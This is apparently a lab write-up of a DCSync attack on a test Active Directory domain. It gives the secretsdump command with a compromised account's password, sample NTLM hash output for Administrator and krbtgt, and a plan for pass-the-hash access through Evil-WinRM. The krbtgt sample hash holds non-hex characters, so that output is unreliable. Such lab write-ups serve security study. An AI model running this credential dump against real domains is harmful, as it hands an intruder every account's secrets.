# DCSync with Impacket

Once we identified that replication permissions were assigned to the compromised account, the next step was to perform a DCSync attack using Impacket's `secretsdump.py`.

The objective was to request Active Directory replication data directly from the Domain Controller and retrieve credential material without accessing the NTDS.dit database or dumping LSASS.

## Attack Command

```bash
impacket-secretsdump raynex.lab/jgonzalez:'Raynex2026'@10.0.0.28
```

## What Happened?

Although the tool reported an initial RPC access denied message:

```text
RemoteOperations failed: rpc_s_access_denied
```

the attack continued using the DRSUAPI replication method and successfully extracted Active Directory secrets.

This behavior is expected because DCSync relies on the Directory Replication Service (DRS) rather than Remote Operations.

## Credentials Retrieved

The attack successfully replicated credential material for multiple domain accounts, including:

- Administrator
- krbtgt
- Domain users
- Machine accounts

Example output:

```text
Administrator:500:aad3b435b51404eeaad3b435b51404ee:4a897948027940da8cd29f158c1c88db
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:f3c7hcag671e5a56a310d974f5a977ba
```

In addition to NTLM hashes, the attack also retrieved:

- AES256 Kerberos keys
- AES128 Kerberos keys
- DES keys
- Machine account secrets

## Impact

A successful DCSync attack allows an attacker to retrieve authentication material for every account in the domain.

No files were copied from the Domain Controller, and LSASS was never accessed.

Instead, the Domain Controller replicated the requested information because the compromised account possessed legitimate replication permissions.

## Next Step

With valid NTLM hashes extracted, the next phase is to authenticate using **Pass-the-Hash** and obtain remote administrative access through **Evil-WinRM**.
